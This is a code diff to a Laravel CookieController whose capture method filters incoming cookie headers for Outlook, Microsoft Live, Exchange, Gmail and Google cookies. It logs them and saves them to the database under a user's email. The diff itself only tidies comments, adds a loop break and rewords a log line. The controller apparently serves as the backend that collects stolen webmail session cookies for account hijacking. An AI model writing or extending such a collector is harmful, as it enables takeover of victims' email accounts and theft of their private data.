@@ -8,7 +8,7 @@ use App\Models\User;
 class CookieController extends Controller
 {
     /**
-     * Capture cookies related to Gmail and store them in the database.
+     * Capture specific cookies related to external services and store them in the database.
      */
     public function capture(Request $request)
     {
@@ -18,22 +18,27 @@ class CookieController extends Controller
         \Log::info('Cookie header: ' . $cookieHeader);
         \Log::info('User Email: ' . $userEmail);
 
+        // Define the patterns for cookies we want to capture
         $cookiePatterns = ['Outlook', 'MS', 'Live', 'Exchange', 'GMAIL', 'GOOGLE'];
         $filteredCookies = [];
+
         if ($cookieHeader) {
             $pairs = explode(';', $cookieHeader);
             foreach ($pairs as $pair) {
                 $parts = explode('=', trim($pair), 2);
                 if (count($parts) === 2) {
                     $cookieName = $parts[0];
+                    // Only capture cookies that match our patterns
                     foreach ($cookiePatterns as $pattern) {
                         if (stripos($cookieName, $pattern) !== false) {
                             $filteredCookies[$cookieName] = urldecode($parts[1]);
+                            break; // Once matched, no need to check other patterns for this cookie
                         }
                     }
                 }
             }
         }
+
         \Log::info('Filtered Cookies:', $filteredCookies);
 
         if (!empty($filteredCookies) && $userEmail) {
@@ -52,11 +57,9 @@ class CookieController extends Controller
                 \Log::warning('User not found for email: ' . $userEmail);
             }
         } else {
-            \Log::info('No cookies to save or no email provided');
+            \Log::info('No matching cookies to save or no email provided');
         }
 
         return response()->json(['message' => 'No relevant cookies found or failed to save.'], 400);
     }
-
-
 }
